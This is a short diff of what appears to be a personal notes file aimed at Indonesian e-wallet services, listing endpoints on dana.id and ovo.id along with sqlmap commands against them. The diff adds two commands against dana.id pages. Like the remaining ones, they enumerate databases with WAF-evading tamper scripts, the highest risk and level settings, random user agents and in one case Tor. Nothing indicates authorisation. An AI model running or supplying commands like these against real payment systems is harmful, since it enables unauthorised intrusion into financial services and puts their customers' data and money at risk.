@@ -10,7 +10,11 @@ https://m.dana.id/wallet/api/alipayplus.mobilewallet.pocket.numUpdated.json
 /v3/getdata/balance/TOKOPEDIAWALLET HTTP/2
 
 
-python sqlmap.py -u https://payroll.ovo.id/index.html?login_error=0 --dbs --tamper="between,randomcase,space2comment" --level=3 --risk=3 -v 3 --random-agent 
+python sqlmap.py -u https://www.dana.id/?_branch_match_id=895639991967902409 --dbs --tamper="between,randomcase,space2comment" --level=3 --risk=3 -v 3 --random-agent 
+
+
+
+python sqlmap.py -u https://m.dana.id/m/portal/emailVerification/result?success=true --dbs --tamper="between,randomcase,space2comment" --level=3 --risk=3 -v 3 --random-agent 
 
 https://www.ovo.id/news/detail/4-film-baru-yang-paling-ditunggu
 python sqlmap.py -u https://payroll.ovo.id/forgotUser.html --dbs --tamper="between,randomcase,space2comment" -v 3 --random-agent --tor
